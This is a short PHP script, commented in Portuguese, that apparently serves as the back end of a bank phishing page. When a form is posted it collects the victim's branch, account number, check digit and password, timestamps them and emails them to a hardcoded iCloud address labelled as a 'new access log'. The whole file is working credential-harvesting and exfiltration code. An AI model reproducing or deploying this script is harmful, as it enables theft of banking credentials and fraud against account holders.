<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Verifica se os dados foram enviados corretamente
    if (isset($_POST['agencia'], $_POST['conta'], $_POST['digitoConta'], $_POST['senha'])) {
        $agencia = $_POST['agencia'];
        $conta = $_POST['conta'];
        $digitoConta = $_POST['digitoConta'];
        $senha = $_POST['senha'];
        $data_hora = date('Y-m-d H:i:s');

        // Monta a linha de log
        $linhaLog = "$data_hora - Agência: $agencia, Conta: $conta, Dígito: $digitoConta, Senha: $senha\n";

        // Destinatário e assunto do e-mail
        $destinatario = "renatosantos048383@icloud.com"; // Substitua pelo seu e-mail
        $assunto = "Novo Log de Acesso";
        $headers = "From: noreply@example.com"; // Remetente

        // Envia o e-mail
        if (mail($destinatario, $assunto, $linhaLog, $headers)) {
            exit();
        } 
    }
}
?>
